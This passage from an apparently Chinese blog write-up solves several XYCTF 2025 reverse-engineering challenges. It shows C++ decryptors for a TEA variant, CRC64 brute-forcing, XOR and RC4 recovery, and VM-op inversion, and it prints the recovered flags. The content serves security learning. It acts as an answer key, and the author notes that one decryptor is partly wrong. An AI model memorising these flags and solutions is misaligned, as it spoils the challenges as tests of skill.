class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ tmp);</span><br><span class="line">        v0 -= tmp2;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取chal程序中的密文，进行解密即可。</p><p>完整解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0x5f5fe6e7</span> * <span class="number">72</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 -= tmp4;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ tmp);</span><br><span class="line">        v0 -= tmp2;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key[]&#123;</span><br><span class="line">        <span class="number">0x776f6853</span>,</span><br><span class="line">        <span class="number">0x656b616d</span>,</span><br><span class="line">        <span class="number">0x616d5f72</span>,</span><br><span class="line">        <span class="number">0x74696564</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Encflag[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x696C2E9A</span>, <span class="number">0x76ADE8E1</span>, <span class="number">0xE67D5CA4</span>, <span class="number">0x5C76BD38</span>,</span><br><span class="line">        <span class="number">0xB7AC0787</span>, <span class="number">0xBFEA0C65</span>, <span class="number">0x01C2FF10</span>, <span class="number">0x6D16FD38</span>&#125;;</span><br><span class="line">    <span class="built_in">decipher</span>(Encflag, key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">8</span>), key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">16</span>), key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">24</span>), key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, Encflag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XYCTF{fun_un1c0rn_with_4rm64_VM}</p><h2 id="Moon"><a href="#Moon" class="headerlink" title="Moon"></a>Moon</h2><p>跟到moon.xor_crypt实际加密处。</p><p><img src="/2025/04/07/XYCTF2025/6.png"></p><p>发现是进行了单次xor，并加入到一个list中，前后过程不清楚。</p><p>断在xor这个命令，运行附加调试，随便输入一串1</p><p><img src="/2025/04/07/XYCTF2025/7.png"></p><p><img src="/2025/04/07/XYCTF2025/8.png"></p><p>发现是输入的’1’和一个0x24进行xor，多运行几次发现就是将输入的字符串都异或上一些值。</p><p>直接断在return处，v20是最后将list转成Bytes的结果。</p><p><img src="/2025/04/07/XYCTF2025/9.png"></p><p>发现是28长度的一串字节，从0x15开始的，就是我们输入字符串长度以及异或完的结果。</p><p><img src="/2025/04/07/XYCTF2025/10.png"></p><p>继续运行会返回到check_flag代码处，底下有一个RichCompare比较两个数据。</p><p><img src="/2025/04/07/XYCTF2025/11.png"></p><p>v45可以看到就是将刚刚v20的bytes直接unhex转成了一串字符串。</p><p><img src="/2025/04/07/XYCTF2025/12.png"></p><p>那么v9就应该是flag的密文，可以数出一共是要35字节。</p><p><img src="/2025/04/07/XYCTF2025/13.png"></p><p>重新调试运行输入35个1，在check_flag开头断点，把输入的字符串全都patch成0。</p><p><img src="/2025/04/07/XYCTF2025/14.png"></p><p><img src="/2025/04/07/XYCTF2025/15.png"></p><p><img src="/2025/04/07/XYCTF2025/16.png"></p><p>最后在RichCompare处就可以得到xor密文的列表。</p><p><img src="/2025/04/07/XYCTF2025/17.png"></p><p>将v9的密文与这个数据进行xor即可得到flag。</p><p><img src="/2025/04/07/XYCTF2025/18.png"></p><p>flag{but_y0u_l00k3d_up_@t_th3_mOOn}</p><h2 id="Dragon（5m10v3师傅解题）"><a href="#Dragon（5m10v3师傅解题）" class="headerlink" title="Dragon（5m10v3师傅解题）"></a>Dragon（5m10v3师傅解题）</h2><p>.bc 后缀 </p><p>反编译为LLVM IR</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-dis-<span class="number">17</span> Dragon.bc -o Dragon.ll</span><br></pre></td></tr></table></figure><p>分析得知为crc64，以两个为一组进行校验，直接爆破就行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">calculate_crc64_direct</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">uint64_t</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> crc = <span class="number">0xFFFFFFFFFFFFFFFFULL</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint64_t</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        crc ^= ((<span class="type">uint64_t</span>)data[i] &lt;&lt; <span class="number">56</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint64_t</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (crc &amp; <span class="number">0x8000000000000000ULL</span>) &#123; </span><br><span class="line">                crc = (crc &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x42F0E1EBA9EA3693ULL</span>; </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                crc = crc &lt;&lt; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ~crc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> enc[<span class="number">12</span>] = &#123;</span><br><span class="line">       <span class="number">-2565957437423125689</span>, </span><br><span class="line">        <span class="number">224890624719110086</span>, </span><br><span class="line">        <span class="number">1357324823849588894</span>, </span><br><span class="line">        - <span class="number">8941695979231947288</span>, </span><br><span class="line">        - <span class="number">253413330424273460</span>, </span><br><span class="line">        - <span class="number">7817463785137710741</span>, </span><br><span class="line">        - <span class="number">5620500441869335673</span>, </span><br><span class="line">        <span class="number">984060876288820705</span>, </span><br><span class="line">        - <span class="number">6993555743080142153</span>, </span><br><span class="line">        - <span class="number">7892488171899690683</span>, </span><br><span class="line">        <span class="number">7190415315123037707</span>, </span><br><span class="line">        - <span class="number">7218240302740981077</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">25</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> flag_index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">12</span>; k++) &#123;</span><br><span class="line">        <span class="type">uint64_t</span> target_crc = enc[k];</span><br><span class="line">        <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c1 = <span class="number">32</span>; c1 &lt; <span class="number">127</span> &amp;&amp; !found; c1++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c2 = <span class="number">32</span>; c2 &lt; <span class="number">127</span> &amp;&amp; !found; c2++) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> test[<span class="number">2</span>] = &#123; c1, c2 &#125;;</span><br><span class="line">                <span class="type">uint64_t</span> crc = <span class="built_in">calculate_crc64_direct</span>(test, <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (crc == target_crc) &#123;</span><br><span class="line">                    flag[flag_index++] = c1;</span><br><span class="line">                    flag[flag_index++] = c2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    flag[flag_index] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted flag: %s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;LLVM_1s_Fun_Ri9h7?&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Summer（5m10v3师傅解题）"><a href="#Summer（5m10v3师傅解题）" class="headerlink" title="Summer（5m10v3师傅解题）"></a>Summer（5m10v3师傅解题）</h2><p>haskell程序</p><p>函数式编程语言,这意味着一切都是惰性计算，什么是惰性计算？ 简单来说就是在调用之前不会对该值进行计算</p><p>浏览 main 函数，可以看到 hs_main 将 ZCMain_main_closure 作为它的参数，它指向 haskell 程序的真正入口点</p><p><img src="/2025/04/07/XYCTF2025/31.png"></p><p>ZCMain_main_closure里面我们发现它调用了stg_ap_p_fast，这个是底层函数，主要调用Main_main_closure这个函数</p><p><img src="/2025/04/07/XYCTF2025/19.png"></p><p>GHCziInternalziBase也是底层函数，主要关注两个参数</p><p><img src="/2025/04/07/XYCTF2025/20.png"></p><p>第一个参数的地址处的函数为打印字符串</p><p><img src="/2025/04/07/XYCTF2025/21.png"></p><p><img src="/2025/04/07/XYCTF2025/22.png"></p><p>GHCziInternalziList_length 为处理我们的传入的字符串的长度，直接调用的是zdwlenAcc**，**zdwlenAcc 将通过检查下一个是否是列表的末尾来计算 “flagTable” 的长度（这里的”flagTable” 是我自己命名,其实就是存储惰性列表，我们可以根据惰性列表的指针数判断字符串的长度）</p><p><img src="/2025/04/07/XYCTF2025/23.png"></p><p><img src="/2025/04/07/XYCTF2025/24.png"></p><p>我们这里就用flag进行测试，一方面是为了查看他的返回值</p><p><img src="/2025/04/07/XYCTF2025/25.png"></p><p>此时他是将rbx此处(即为惰性列表的末尾)，可以人工数(即为50)</p><p><img src="/2025/04/07/XYCTF2025/26.png"></p><p>另外一种为看返回值，第一次断下是返回我们输入字符串的长度，第二次断下是返回密钥的长度，第三次断下是返回密文的长度</p><p><img src="/2025/04/07/XYCTF2025/27.png"></p><p><img src="/2025/04/07/XYCTF2025/28.png"></p><p><img src="/2025/04/07/XYCTF2025/29.png"></p><p>另外一处为GHCziInternalziNum_zdfNumIntzuzdczp，这个也是在网上一篇文章看到的,在<strong>add     rbx, [rax]</strong> 在经过几次迭代后，我可以看到一些字符开始出现，此时我们可以得到密钥为<strong>Klingsor’s_Last_Summer</strong></p><p><img src="/2025/04/07/XYCTF2025/30.png"></p><p>我们在.data段得到了密钥，因此我们可以猜测下面可能为密文,并且下面都是指针+元素的存储形式</p><p><img src="/2025/04/07/XYCTF2025/32.png"></p><p><img src="/2025/04/07/XYCTF2025/33.png"></p><p>然后通过CE调试得到明文和密文，然后得出为rc4+xor</p><p><img src="/2025/04/07/XYCTF2025/34.png"></p><p><img src="/2025/04/07/XYCTF2025/35.png"></p><p>flag{Us3_H@sk3ll_t0_f1nd_th3_truth_1n_th1s_Summ3R}</p><h2 id="Lake"><a href="#Lake" class="headerlink" title="Lake"></a>Lake</h2><p>单步跟到主函数。</p><p><img src="/2025/04/07/XYCTF2025/36.png"></p><p>这边输入字符串后先赋值到了另一个数组，然后进行了一次简易VM计算进行了第一次加密，</p><p><img src="/2025/04/07/XYCTF2025/37.png"></p><p>然后接着第二次加密，最后循环比较。</p><p><img src="/2025/04/07/XYCTF2025/38.png"></p><p><img src="/2025/04/07/XYCTF2025/39.png"></p><p>发现VM只用到了加减和XOR计算，在这三个地方的关键点打断点，输出寄存器和计算流程，这边为了方便直接复制到代码里面解密，将加减断点里面的输出运算符反过来，输出出来的代码直接复制到代码就是进行解密的流程。</p><p><img src="/2025/04/07/XYCTF2025/40.png"></p><p><img src="/2025/04/07/XYCTF2025/41.png"></p><p><img src="/2025/04/07/XYCTF2025/42.png"></p><p>调试输出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Input[<span class="number">2</span>] += <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">26</span>] -= <span class="number">85</span>;</span><br><span class="line">Input[<span class="number">35</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">14</span>] += <span class="number">9</span>;</span><br><span class="line">Input[<span class="number">27</span>] -= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">6</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">1</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">27</span>] += <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">25</span>] += <span class="number">3</span>;</span><br><span class="line">Input[<span class="number">26</span>] += <span class="number">4</span>;</span><br><span class="line">Input[<span class="number">4</span>] ^= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">3</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">12</span>] += <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">37</span>] -= <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">32</span>] -= <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">9</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">26</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">4</span>] += <span class="number">13</span>;</span><br><span class="line">Input[<span class="number">8</span>] ^= <span class="number">15</span>;</span><br><span class="line">Input[<span class="number">10</span>] += <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">16</span>] -= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">12</span>] -= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">34</span>] ^= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">21</span>] ^= <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">39</span>] -= <span class="number">126</span>;</span><br><span class="line">Input[<span class="number">7</span>] += <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">15</span>] ^= <span class="number">3</span>;</span><br><span class="line">Input[<span class="number">10</span>] ^= <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">34</span>] -= <span class="number">11</span>;</span><br><span class="line">Input[<span class="number">18</span>] += <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">25</span>] += <span class="number">9</span>;</span><br><span class="line">Input[<span class="number">14</span>] ^= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">0</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">10</span>] -= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">27</span>] ^= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">13</span>] ^= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">13</span>] ^= <span class="number">4</span>;</span><br><span class="line">Input[<span class="number">23</span>] ^= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">34</span>] ^= <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">18</span>] += <span class="number">52</span>;</span><br><span class="line">Input[<span class="number">38</span>] -= <span class="number">119</span>;</span><br></pre></td></tr></table></figure><p>这也就是第一层加密的解密代码。</p><p>第二层加密直接对着写即可，我写的有点问题（懒得改），其中几个字节解密不对，不过根据解密出的flag也能猜出是啥，替换完那几个字节就得到完整的flag。</p><p>完整解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">40</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(temp, data, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> base = <span class="number">4</span> * i;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> block[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (base &lt; len)</span><br><span class="line">        &#123;</span><br><span class="line">            block[<span class="number">0</span>] = ((temp[base + <span class="number">2</span>] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">3</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line">            block[<span class="number">1</span>] = (temp[base] &gt;&gt; <span class="number">3</span>) | ((temp[base + <span class="number">3</span>] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>);</span><br><span class="line">            block[<span class="number">2</span>] = ((temp[base] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line">            block[<span class="number">3</span>] = ((temp[base + <span class="number">1</span>] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">2</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span> &amp;&amp; base + j &lt; len; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                data[base + j] = block[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Input[<span class="number">48</span>] = &#123;</span><br><span class="line">        <span class="number">0x4A</span>, <span class="number">0xAB</span>, <span class="number">0x9B</span>, <span class="number">0x1B</span>, <span class="number">0x61</span>, <span class="number">0xB1</span>, <span class="number">0xF3</span>, <span class="number">0x32</span>, <span class="number">0xD1</span>, <span class="number">0x8B</span>, <span class="number">0x73</span>, <span class="number">0xEB</span>, <span class="number">0xE9</span>, <span class="number">0x73</span>, <span class="number">0x6B</span>, <span class="number">0x22</span>,</span><br><span class="line">        <span class="number">0x81</span>, <span class="number">0x83</span>, <span class="number">0x23</span>, <span class="number">0x31</span>, <span class="number">0xCB</span>, <span class="number">0x1B</span>, <span class="number">0x22</span>, <span class="number">0xFB</span>, <span class="number">0x25</span>, <span class="number">0xC2</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0x73</span>, <span class="number">0x22</span>, <span class="number">0xFA</span>, <span class="number">0x03</span>,</span><br><span class="line">        <span class="number">0x9C</span>, <span class="number">0x4B</span>, <span class="number">0x5B</span>, <span class="number">0x49</span>, <span class="number">0x97</span>, <span class="number">0x87</span>, <span class="number">0xDB</span>, <span class="number">0x51</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decrypt_func</span>(Input, <span class="number">40</span>);</span><br><span class="line">    Input[<span class="number">2</span>] += <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">26</span>] -= <span class="number">85</span>;</span><br><span class="line">    Input[<span class="number">35</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">14</span>] += <span class="number">9</span>;</span><br><span class="line">    Input[<span class="number">27</span>] -= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">6</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">1</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">27</span>] += <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">25</span>] += <span class="number">3</span>;</span><br><span class="line">    Input[<span class="number">26</span>] += <span class="number">4</span>;</span><br><span class="line">    Input[<span class="number">4</span>] ^= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">3</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">12</span>] += <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">37</span>] -= <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">32</span>] -= <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">9</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">26</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">4</span>] += <span class="number">13</span>;</span><br><span class="line">    Input[<span class="number">8</span>] ^= <span class="number">15</span>;</span><br><span class="line">    Input[<span class="number">10</span>] += <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">16</span>] -= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">12</span>] -= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">34</span>] ^= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">21</span>] ^= <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">39</span>] -= <span class="number">126</span>;</span><br><span class="line">    Input[<span class="number">7</span>] += <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">15</span>] ^= <span class="number">3</span>;</span><br><span class="line">    Input[<span class="number">10</span>] ^= <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">34</span>] -= <span class="number">11</span>;</span><br><span class="line">    Input[<span class="number">18</span>] += <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">25</span>] += <span class="number">9</span>;</span><br><span class="line">    Input[<span class="number">14</span>] ^= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">0</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">10</span>] -= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">27</span>] ^= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">13</span>] ^= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">13</span>] ^= <span class="number">4</span>;</span><br><span class="line">    Input[<span class="number">23</span>] ^= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">34</span>] ^= <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">18</span>] += <span class="number">52</span>;</span><br><span class="line">    Input[<span class="number">38</span>] -= <span 